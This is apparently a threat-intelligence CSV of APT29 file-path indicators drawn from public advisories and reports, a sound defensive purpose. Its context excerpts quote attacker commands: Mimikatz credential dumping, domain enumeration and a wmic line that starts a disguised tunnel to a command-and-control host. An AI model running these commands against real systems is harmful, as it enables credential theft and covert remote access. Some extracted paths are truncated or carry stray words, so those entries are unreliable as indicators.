schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:d9e4fd2ff3a49987d191f2aa0d6896ac7fc69f8491203859e85b842706f15022,observation--sha256:be1132a7f7e4868133ee39c1bc850b7a7ff198557f26c6f3ff0da59d16dbbeef,file-path,C:\Program Files (x86)\Microsoft Visual,C:\Program Files (x86)\Microsoft Visual,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:764cda9940827eda856ec21a2dc1ed450bbbadea7b75c70edd4651de3fa0ca63,observation--sha256:63d66a38e94e84cefb600a19174d6e7009489b289f45cf8fe732c66ed44f6a7e,file-path,C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe,C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:bdc4925495276ec384db841836125b51032d0f42319f763eb14ead74050e9cef,observation--sha256:7e250fdc719f7c887248a200a83aff516120fd22ef8cae5ba2211b8fd77b0b54,file-path,C:\Program Files\Common Files\Logitech\WMDrivers\,C:\Program Files\Common Files\Logitech\WMDrivers\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:147c8a751a42dc250c9241bb5ef96f48f6754bf21f8c004eb9a98f0327951b73,observation--sha256:3303f4b1cfb8054d60bde76bb1f4a67f0a0b9afce31ac68af2efaab993008a63,file-path,C:\Program Files\Microsoft SQL,C:\Program Files\Microsoft SQL,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:29c7c0c8122ee5386a5ab5698cbb973ab3c4b232bf6c8adbbaa143b104fd1bbe,observation--sha256:d633cccc449a9c73ebe6b44795e6af1161292bc5fc78ac54a3df959cf36dd968,file-path,C:\Program Files\Windows,C:\Program Files\Windows,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 13 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Windows Management Instrumentation T1047 SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads. wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554- 0sddsf2@34232fsl45t31"" Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and ",
1.0.0,actor--apt29,artifact--sha256:ce7c8ea44b3d2f7df6bcb130044ad0df2c09bd847c5d07fbffb5ce748519dd35,observation--sha256:435b5a42285a67665c665226bf38442d5f9a536d9ad0b2e6337000b39be43b2c,file-path,C:\Program Files\Windows Defender Advanced Threat,C:\Program Files\Windows Defender Advanced Threat,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:55c2760decb1b40c05589a059dba39cf7a1203c6f4abd6f4c819c432455fec49,observation--sha256:9992cef2a19260780e8c8cfd90f7a039a4422bafd6d2b4a6ce40e38347eb20a9,file-path,C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\,C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:2530c6867d0d81cb4a6cadb1698c693df6f09631bd4e42d4a5406366fc765d2b,observation--sha256:9a3aa6785ee04d9f7d166c1ee1997275732769d2c67b5f6cc21fe5d495faacef,file-path,C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557-,C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:5cab28516cb6391d6341bbddddce375a6a431e22455632833a3a71c753400264,observation--sha256:088058f6188a3d094d5cd67b7f79c612d5050389cec2f121603b2171e3e68721,file-path,C:\ProgramData\JetBrains\TeamCity\config\internal.properties by,C:\ProgramData\JetBrains\TeamCity\config\internal.properties by,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:a9939bf483006991d9099ca2d7de52dfbe7eaba079765b367a41fe760b669386,observation--sha256:c0303e40ef23ba67a85045a914b61f2408a5a66cd932103b6422840f6e21633d,file-path,C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified,C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:d4bf5990ed3011d41a65e7e970db7d5d949c3880ab538cad9c7cd771ea42ebbf,observation--sha256:fb786b0938fc045512f7a9258afe6e6429624164b7015de72aad7fa1c91f4d86,file-path,C:\TeamCity\logs\teamcity-server.log will contain a log,C:\TeamCity\logs\teamcity-server.log will contain a log,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:f13a2fa736c1c0389ba9dbb042ed2a84c747aa39a633e97c61c347a32a3f657b,observation--sha256:540bdefe24726116a66d17fc6dc9b975aa090f291a92493619fe3dae3b6a77f0,file-path,C:\WINDOWS\system32\config\systemprofile\AppData\Local\Goo-,C:\WINDOWS\system32\config\systemprofile\AppData\Local\Goo-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:19f9b00f8840974977df9f3c92f5a7bf6b7441d158ebd964711f1d760eb4ce14,observation--sha256:8fa458000a768a27e348e40c100fa4524b4323004cd25057d07b1a2818a79c28,file-path,C:\Windows\System32,C:\Windows\System32,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:e4fc6e8beda394ef7436b75842eb7f19f1b1cf931133189a30b16d27d58fc8de,observation--sha256:91d97210a4733be9934c10263c226827a2eba0fae19692b0c1f0c3aa8e50f67a,file-path,C:\Windows\System32\ntoskrnl.exe,C:\Windows\System32\ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:467b0a04c999b5171c2564c0f90c573cf014537b58b44fc50cd27c61174d0840,observation--sha256:561fa5d9484bf641f4f3ec6c97121030d9e5c44782424f7b41efd8b6f3241ab8,file-path,C:\Windows\Temp\,C:\Windows\Temp\,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:771d7610b8d4d7039a721df9c424f3aa837e4497ebf225389b007b7bd9fc14d0,observation--sha256:2950e8e55fe68e73a98b9590952afaed2e081834390d36d7f3faad8bfd82e88f,file-path,C:\Windows\WinStore,C:\Windows\WinStore,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:cc42a08a4d950f0cf0b81606c7a82fab526d58f62da77461dd30042331d1de2e,observation--sha256:bc7b74f06912214f3f155418034a7512431e69202b8daddb0252ea8a6c375915,file-path,C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:2fd1fc8387812773bf9c7487eb3d053e8f521be385628768bd6df47d5e5b9d8e,observation--sha256:474ae29137cdae2095ace57a2b195a45cde82925e12d9845528e54856b7c9a58,file-path,C:\Windows\system32\ntoskrnl.exe,C:\Windows\system32\ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 10 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence Technique Title ID Use Scheduled Task T1053.005 SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code. Server Software Component: SQL Stored Procedures T1505.001 SVR cyber actors abuse SQL server stored procedures to maintain persistence. Boot or Logon Autostart Execu,
1.0.0,actor--apt29,artifact--sha256:c326b24c684584d63468cd72818742a8ae2047f5f7fd26eab8e058e4d90d1fc3,observation--sha256:8839530e76739ea075379ca472ea147e359ba870952bc14703472f27a2435ee6,file-path,"C:\Windows\system32\ntoskrnl.exe [T1547] – to precisely identify system version, likely as a","C:\Windows\system32\ntoskrnl.exe [T1547] – to precisely identify system version, likely as a",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:74510caf4d6583de6adb25b163c184607b07d4756f0afa893605449b9f0b83b3,observation--sha256:d5639d13226e4cd84889023f1d1436ede85931333fbbf685fc33646a003ea360,file-path,C:\Windows\temp,C:\Windows\temp,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
